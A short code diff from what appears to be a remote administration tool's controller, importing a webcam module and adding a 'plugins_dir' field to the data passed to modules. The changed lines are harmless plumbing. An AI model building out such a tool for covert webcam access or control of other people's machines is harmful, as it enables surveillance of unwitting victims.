@@ -22,6 +22,7 @@ from modules.mwebcam import main as mwebcam
 translate = Translate()
 _ = lambda _word: translate.word(_word)
 
+
 def id_generator(size=16, chars=string.ascii_uppercase + string.digits):
     return ''.join(random.choice(chars) for _ in range(size))
 
@@ -148,6 +149,7 @@ class Actions:
                 'session_id': self.moderat.session_id,
                 'assets': self.moderat.assets,
                 'plugins': self.moderat.plugins,
+                'plugins_dir': self.moderat.plugins_dir,
                 'module_id': module_id,
             }
             if module in modules:
